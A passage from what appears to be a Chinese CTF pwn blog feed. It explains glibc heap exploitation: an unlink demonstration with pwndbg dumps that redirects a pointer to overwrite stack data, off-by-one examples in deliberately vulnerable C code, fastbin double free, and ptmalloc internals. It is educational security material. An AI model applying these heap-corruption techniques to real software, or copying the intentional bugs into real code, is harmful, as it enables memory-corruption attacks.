class="number">0x6020d0</span>:<span class="number">0x0000000000000000</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><h3 id="触发unlink"><a href="#触发unlink" class="headerlink" title="触发unlink"></a>触发unlink</h3><p>当我们free(chunk2)的时候，因为prev_in_use位被置0，代表前一个chunk（也就是我们的fake_chunk)也处于free，连续的空闲堆块合并而进行unlink操作。<br>也就是设置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd-&gt;bk = P-&gt;bk.</span><br><span class="line">P-&gt;bk-&gt;fd = P-&gt;fd.</span><br></pre></td></tr></table></figure></p><p>可以看出fake_chunk-&gt;fd-&gt;bk和fake_chunk-&gt;bk-&gt;fd都指向(或者说等于)chunk1,即0x0000000000602010，所以只需要关注第二次操作即可。</p><p>P-&gt;fd即fake_chunk-&gt;fd=0x00007fffffffdd48<br>所以unlink之后,P-&gt;bk-&gt;fd由0x602010变为0x00007fffffffdd48<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x602010</span> &lt;=P-&gt;bk-&gt;fd</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x602090</span> ◂— <span class="number">0x80</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br></pre></td></tr></table></figure></p><p>变为<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd60</span> —▸ <span class="number">0x7fffffffdd48</span> &lt;=P-&gt;bk-&gt;fd</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd68</span> —▸ <span class="number">0x6020a0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd70</span> —▸ <span class="number">0x602010</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│      <span class="number">0x7fffffffdd78</span> —▸ <span class="number">0x602090</span> ◂— <span class="number">0x80</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd80</span> —▸ <span class="number">0x7fffffffddb0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│      <span class="number">0x7fffffffdd88</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd90</span> —▸ <span class="number">0x400800</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│      <span class="number">0x7fffffffdd98</span> ◂— <span class="number">0xb7dbaa1d9dced400</span></span><br></pre></td></tr></table></figure></p><p>也就是说现在chunk1的值变成了0x7fffffffdd48，chunk1[3]实际上就是chunk1。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">45</span>  <span class="built_in">printf</span>(<span class="string">"%p\n"</span>, chunk1);</span><br><span class="line"><span class="number">46</span>  <span class="built_in">printf</span>(<span class="string">"%x\n"</span>, chunk1[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">pwndbg&gt; b <span class="number">47</span></span><br><span class="line">Breakpoint <span class="number">3</span> at <span class="number">0x400788</span>: file unlink.c, line <span class="number">47.</span></span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line"><span class="number">0x7fffffffdd48</span></span><br><span class="line">ffffdd48</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-28-155409.png" alt=""></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><p>改变chunk1[3]就是改变chunk1,在本例中, chunk1用于指向变量data并且通过改变chunk1从而影响到了该变量。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1[3] = (unsigned long long)data;</span><br></pre></td></tr></table></figure></p><p>可以看出现在chunk1的值已经变成了data的地址0x7fffffffdd80<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rdx rsp  0x7fffffffdd60 —▸ 0x7fffffffdd80 —▸ 0x7fffffffddb0 ◂— 0x0</span><br></pre></td></tr></table></figure></p><p>改变data的值为Victim’s data<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">strcpy</span>(data, <span class="string">"Victim's data"</span>);</span><br></pre></td></tr></table></figure></p><p>在内存中查看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /s 0x7fffffffdd80</span><br><span class="line">0x7fffffffdd80:&quot;Victim&apos;s data&quot;</span><br></pre></td></tr></table></figure></p><p>现在的chunk1已经指向data了，通过给chunk1[0]赋值，其实就是给data赋值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk1[0] = 0x002164656b636168LL;</span><br></pre></td></tr></table></figure></p><p>查看内存<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /s 0x7fffffffdd80</span><br><span class="line">0x7fffffffdd80:&quot;hacked!&quot;</span><br></pre></td></tr></table></figure></p><p>果然已经变了。<br>字符串已经变成了hacked!<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; n</span><br><span class="line">hacked!</span><br></pre></td></tr></table></figure></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html" target="_blank" rel="noopener">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit.html</a></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>堆漏洞</title>
      <link href="/2018/02/28/heap_exp1/"/>
      <url>/2018/02/28/heap_exp1/</url>
      <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>堆溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数），因而导致了数据溢出，并覆盖到物理相邻的高地址的下一个堆块。</p><p>堆溢出漏洞发生的基本前提是</p><ul><li>程序向堆上写入数据。</li><li>写入的数据大小没有被良好地控制。</li></ul><p>堆上并不存在返回地址等可以让攻击者直接控制执行流程的数据，因此我们一般无法直接通过堆溢出来控制 EIP 。一般来说，我们利用堆溢出的策略是</p><ul><li>覆盖与其物理相邻的下一个 chunk 的元数据。</li><li>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>堆溢出中比较重要的几个步骤:</p><h3 id="寻找堆分配函数"><a href="#寻找堆分配函数" class="headerlink" title="寻找堆分配函数"></a>寻找堆分配函数</h3><p>通常来说堆是通过调用 glibc 函数 malloc 进行分配的，在某些情况下会使用 calloc 分配。calloc 与 malloc 的区别是 calloc 在分配后会自动进行清空，这对于某些信息泄露漏洞的利用来说是致命的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">calloc(0x20);</span><br><span class="line">//等同于</span><br><span class="line">ptr=malloc(0x20);</span><br><span class="line">memset(ptr,0,0x20);</span><br></pre></td></tr></table></figure></p><p>除此之外，还有一种分配是经由 realloc 进行的，realloc 函数可以身兼 malloc 和 free 两个函数的功能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main(void) </span><br><span class="line">&#123;</span><br><span class="line">  char *chunk,*chunk1;</span><br><span class="line">  chunk=malloc(16);</span><br><span class="line">  chunk1=realloc(chunk,32);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>realloc的操作并不是像字面意义上那么简单，其内部会根据不同的情况进行不同操作</p><ul><li>当realloc(ptr,size)的size不等于ptr的size时<ul><li>如果申请size&gt;原来size<ul><li>如果chunk与top chunk相邻，直接扩展这个chunk到新size大小</li><li>如果chunk与top chunk不相邻，相当于free(ptr),malloc(new_size)</li></ul></li><li>如果申请size&lt;原来size<ul><li>如果相差不足以容得下一个最小chunk(64位下32个字节，32位下16个字节)，则保持不变</li><li>如果相差可以容得下一个最小chunk，则切割原chunk为两部分，free掉后一部分</li></ul></li></ul></li><li>当realloc(ptr,size)的size等于0时，相当于free(ptr)</li><li>当realloc(ptr,size)的size等于ptr的size，不进行任何操作</li></ul><h3 id="寻找危险函数"><a href="#寻找危险函数" class="headerlink" title="寻找危险函数"></a>寻找危险函数</h3><p>通过寻找危险函数，我们快速确定程序是否可能有堆溢出，以及有的话，堆溢出的位置在哪里。<br>常见的危险函数如下</p><ul><li>输入<ul><li>gets，直接读取一行，忽略 ‘\x00’</li><li>scanf</li><li>vscanf</li></ul></li><li>输出<ul><li>sprintf</li></ul></li><li>字符串<ul><li>strcpy，字符串复制，遇到 ‘\x00’ 停止</li><li>strcat，字符串拼接，遇到 ‘\x00’ 停止</li><li>bcopy</li></ul></li></ul><h2 id="堆中的-Off-By-One"><a href="#堆中的-Off-By-One" class="headerlink" title="堆中的 Off-By-One"></a>堆中的 Off-By-One</h2><h3 id="off-by-one-漏洞原理"><a href="#off-by-one-漏洞原理" class="headerlink" title="off-by-one 漏洞原理"></a>off-by-one 漏洞原理</h3><p>off-by-one 是指单字节缓冲区溢出，这种漏洞的产生往往与边界验证不严和字符串操作有关，当然也不排除写入的 size 正好就只多了一个字节的情况。其中边界验证不严通常包括</p><ul><li>使用循环语句向堆块中写入数据时，循环的次数设置错误(这在 C 语言初学者中很常见)导致多写入了一个字节。</li><li>字符串操作不合适</li></ul><p>例如</p><ul><li>循环<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">my_gets</span><span class="params">(<span class="keyword">char</span> *ptr,<span class="keyword">int</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;=size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        ptr[i]=getchar();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">void</span> *chunk1,*chunk2;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    chunk2=<span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input:"</span>);</span><br><span class="line">    my_gets(chunk1,<span class="number">16</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000021 &lt;=== chunk2</span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure><p>off-by-one after<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x0000000000000041  0x0000000000000021 &lt;=== chunk2 </span><br><span class="line">0x602030:   0x0000000000000000  0x0000000000000000</span><br></pre></td></tr></table></figure></p><ul><li>字符串<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">40</span>]=<span class="string">""</span>;</span><br><span class="line">    <span class="keyword">void</span> *chunk1;</span><br><span class="line">    chunk1=<span class="built_in">malloc</span>(<span class="number">24</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Get Input"</span>);</span><br><span class="line">    gets(buffer);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strlen</span>(buffer)==<span class="number">24</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">strcpy</span>(chunk1,buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p>strlen 和 strcpy 的行为不一致却导致了off-by-one 的发生。 strlen 是我们很熟悉的计算 ascii 字符串长度的函数，这个函数在计算字符串长度时是不把结束符 ‘\x00’ 计算在内的，但是 strcpy 在复制字符串时会拷贝结束符 ‘\x00’ 。这就导致了我们向chunk1中写入了25个字节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021 &lt;=== chunk1</span><br><span class="line">0x602010:   0x0000000000000000  0x0000000000000000</span><br><span class="line">0x602020:   0x0000000000000000  0x0000000000000411 &lt;=== next chunk</span><br></pre></td></tr></table></figure></p><p>off-by-one after<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x602000:   0x0000000000000000  0x0000000000000021</span><br><span class="line">0x602010:   0x4141414141414141  0x4141414141414141</span><br><span class="line">0x602020:   0x4141414141414141  0x0000000000000400</span><br></pre></td></tr></table></figure></p><p>可以看到 next chunk 的 size 域低字节被结束符 ‘\x00’ 覆盖，这种又属于 off-by-one 的一个分支称为 NULL byte off-by-one，我们在后面会看到 off-by-one 与 NULL byte off-by-one 在利用上的区别。 还是有一点就是为什么是低字节被覆盖呢，因为我们通常使用的CPU的字节序都是小端法的，比如一个DWORD值在使用小端法的内存中是这样储存的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DWORD 0x41424344</span><br><span class="line">内存  0x44,0x43,0x42,0x41</span><br></pre></td></tr></table></figure></p><p>举一个例子，比如数字0x12 34 56 78在内存中的表示形式为：<br>1)大端模式：</p><p>低地址 —————–&gt; 高地址<br>0x12  |  0x34  |  0x56  |  0x78<br>2)小端模式：</p><p>低地址 ——————&gt; 高地址<br>0x78  |  0x56  |  0x34  |  0x12</p><h2 id="unlink"><a href="#unlink" class="headerlink" title="unlink"></a>unlink</h2><p>内容有点多，单独写了一篇文章。<br><a href="http://eternalsakura13.com/2018/03/01/unlink1/">http://eternalsakura13.com/2018/03/01/unlink1/</a></p><h2 id="fastbin-attack"><a href="#fastbin-attack" class="headerlink" title="fastbin attack"></a>fastbin attack</h2><p>fastbin attack 是一类漏洞的利用方法，是指所有基于 fastbin 机制的漏洞利用方法。这类利用的前提是：</p><ul><li>存在堆溢出、use-after-free 等能控制 chunk 内容的漏洞</li><li>漏洞发生于 fastbin 类型的 chunk 中<br>如果细分的话，可以做如下的分类：</li><li>Fastbin Double Free</li><li>House of Spirit</li><li>Alloc to Stack</li><li>Arbitrary Alloc</li></ul><p>其中，前两种主要漏洞侧重于利用free函数释放真的chunk或伪造的chunk，然后再次申请chunk进行攻击，后两种侧重于故意修改fd指针，直接利用malloc 申请指定位置chunk进行攻击。</p><h2 id="Fastbin-Double-Free"><a href="#Fastbin-Double-Free" class="headerlink" title="Fastbin Double Free"></a>Fastbin Double Free</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Fastbin Double Free 是指 fastbin 的 chunk 可以被多次释放，因此可以在 fastbin 链表中存在多次。这样导致的后果是多次分配可以从 fastbin 链表中取出同一个堆块，相当于多个指针指向同一个堆块，结合堆块的数据内容可以实现类似于类型混淆(type confused)的效果。</p><p>Fastbin Double Free 能够成功利用主要有两部分的原因</p><ul><li>fastbin 的堆块被释放后 next_chunk 的 pre_inuse 位不会被清空</li><li>fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3>通过 fastbin double free 我们可以使用多个指针控制同一个堆块，这可以用于篡改一些堆块中的关键数据域或者是实现类似于类型混淆的效果。 如果更进一步修改 fd 指针，则能够实现任意地址分配堆块的效果( 首先要通过验证 )，这就相当于任意地址写任意值的效果。</li></ul>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 堆利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 堆基础 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ptmalloc</title>
      <link href="/2018/02/27/heap1/"/>
      <url>/2018/02/27/heap1/</url>
      <content type="html"><![CDATA[<p>CTF pwn的环境主要是linux，一般用到的是堆内存管理机制叫做ptmalloc。<br>因为很久没有做过相关赛题了，已经忘了很多，于是准备把ptmalloc再整理一下。</p><h2 id="Linux进程地址空间"><a href="#Linux进程地址空间" class="headerlink" title="Linux进程地址空间"></a>Linux进程地址空间</h2><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-085355.jpg" alt=""><br>这种布局是 Linux 内核 2.6.7 以前的默认进程内存布局形式，mmap 区域与栈区域相对增 长，这意味着堆只有 1GB 的虚拟地址空间可以使用，继续增长就会进入 mmap 映射区域。<br>0x4000,0000—-&gt;2^30—–&gt;1G</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-085423.jpg" alt=""><br>栈至顶向下扩展，并且栈是有界的。堆至底向上扩展，mmap 映射区域至顶向下扩展，mmap映射区域和堆相对扩展，直至耗尽虚拟地址空间中的剩余区域，这种结构便于c运行时库使用 mmap 映射区域和堆进行内存分配。上图的布局形式是在内核 2.6.7 以后才引入的，这是 32 位模式下进程的默认内存布局形式。 </p><h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-090021.jpg" alt=""></p><h2 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h2><p>无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 (s)brk 函数以及 mmap, munmap 函数。<br>如下图所示，我们主要考虑对堆进行申请内存块的操作。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-140843.jpg" alt=""></p><h3 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h3><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 brk (program break location, the program break is the address of the first location beyond the current end of the data region, <a href="https://en.wikipedia.org/wiki/Sbrk)的大小来向操作系统申请内存。" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Sbrk)的大小来向操作系统申请内存。</a></p><p>初始时，堆的起始地址 start_brk 以及堆的当前末尾 brk 指向同一地址。根据是否开启ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li></ul><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-02-27-141046.jpg" alt=""></p><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p>malloc 会使用 mmap来创建独立的匿名映射段。匿名映射的目的主要是可以申请以0填充的内存，并且这块内存仅被调用进程所使用。</p><h2 id="多线程支持"><a href="#多线程支持" class="headerlink" title="多线程支持"></a>多线程支持</h2><p>在原来的 dlmalloc 实现中，当两个线程同时调用malloc时，只有一个线程可以进入临界区，因为freelist数据结构是在所有可用线程之间共享的。因此，内存分配在多线程应用程序中需要时间，导致性能下降。<br>而在ptmalloc2中，当两个线程同时调用malloc时，会立即分配内存，因为每个线程维护一个单独的堆段，因此维护这些堆的freelist数据结构也是分开的。<br>这种为每个线程维护单独的堆和freelist数据结构的行为称为per thread arena。<br>在新的实现中，所有的线程共享多个堆。</p><p>这里给出一个例子。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Per thread arena example. */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">threadFunc</span><span class="params">(<span class="keyword">void</span>* arg)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After free in thread 1\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">pthread_t</span> t1;</span><br><span class="line">        <span class="keyword">void</span>* s;</span><br><span class="line">        <span class="keyword">int</span> ret;</span><br><span class="line">        <span class="keyword">char</span>* addr;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to per thread arena example::%d\n"</span>,getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Before malloc in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        addr = (<span class="keyword">char</span>*) <span class="built_in">malloc</span>(<span class="number">1000</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After malloc and before free in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="built_in">free</span>(addr);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After free in main thread\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        ret = pthread_create(&amp;t1, <span class="literal">NULL</span>, threadFunc, <span class="literal">NULL</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Thread creation error\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        ret = pthread_join(t1, &amp;s);</span><br><span class="line">        <span class="keyword">if</span>(ret)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"Thread join error\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>第一次申请之前， 没有任何任何堆段。</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ ./mthread </span><br><span class="line">Welcome to per thread arena example::6501</span><br><span class="line">Before malloc in main thread</span><br><span class="line">...</span><br><span class="line">sploitfun@sploitfun-VirtualBox:~/ptmalloc.ppt/mthread$ cat /proc/6501/maps</span><br><span class="line">08048000-08049000 r-xp 00000000 08:01 